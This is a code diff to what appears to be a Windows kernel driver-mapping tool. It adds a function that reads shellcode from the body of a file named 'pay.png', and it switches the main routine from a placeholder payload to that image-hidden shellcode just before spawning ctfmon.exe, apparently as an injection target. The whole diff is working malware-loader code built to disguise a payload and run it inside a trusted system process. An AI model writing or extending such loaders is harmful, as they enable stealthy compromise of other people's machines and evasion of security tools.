@@ -70,7 +70,48 @@ bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, UL
 	*/
 	return true;
 }
+unsigned char* get_shellcode_from_png(const char* filename, size_t* shellcode_size) {
+    FILE* file = fopen(filename, "rb");
+    if (!file) {
+        perror("Error opening file");
+        return NULL;
+    }
 
+    // Skip the first 8 bytes (PNG signature)
+    fseek(file, 8, SEEK_SET);
+
+    // Get file size
+    fseek(file, 0, SEEK_END);
+    long file_size = ftell(file);
+    size_t sc_size = file_size - 8;
+    fseek(file, 8, SEEK_SET);
+
+    if (sc_size <= 0) {
+        fprintf(stderr, "Invalid shellcode size.\n");
+        fclose(file);
+        return NULL;
+    }
+
+    // Allocate memory for shellcode
+    unsigned char* buffer = (unsigned char*)malloc(sc_size);
+    if (!buffer) {
+        perror("Memory allocation failed");
+        fclose(file);
+        return NULL;
+    }
+
+    // Read shellcode
+    if (fread(buffer, 1, sc_size, file) != sc_size) {
+        perror("Failed to read shellcode");
+        free(buffer);
+        fclose(file);
+        return NULL;
+    }
+
+    fclose(file);
+    *shellcode_size = sc_size;
+    return buffer;
+}
 bool MapDriverFromPath(const std::wstring& driver_path, bool free = false, bool indPages = false, bool copyHeader = false, bool passAllocationPtr = false) {
 	if (!std::filesystem::exists(driver_path))
 		return false;
@@ -124,7 +165,8 @@ int wmain(const int argc, wchar_t** argv) {
     	PROCESS_INFORMATION pi;
     	BOOL success;
 	Sleep(4000); // wait for shared memory to be ready
-	unsigned char shellcode[4096] = { 0x90, 0x90 }; // payload
+	size_t shellcodeSize = 4096;
+	unsigned char* shellcode = get_shellcode_from_png("pay.png", &shellcodeSize);
 	success = CreateProcess(
         L"C:\\Windows\\System32\\ctfmon.exe",
         NULL, NULL, NULL, FALSE,
